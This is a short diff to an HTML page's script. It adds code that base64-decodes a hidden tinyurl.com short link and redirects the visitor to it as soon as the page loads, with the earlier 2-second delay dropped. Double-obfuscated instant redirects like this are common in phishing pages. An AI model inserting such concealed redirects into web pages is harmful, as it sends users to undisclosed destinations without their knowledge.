@@ -10,15 +10,10 @@
         
         const encodedUrl = 'aHR0cHM6Ly90aW55dXJsLmNvbS9iZHo1aDhzbQ=='; 
         
-        // Decode and redirect after 2 second
+        // Decode and redirect instantly
+        const decodedUrl = atob(encodedUrl);
+        window.location.href = decodedUrl;
+        
     </script> 
 </body>
 </html>
-
-
-
-
-
-
-
-
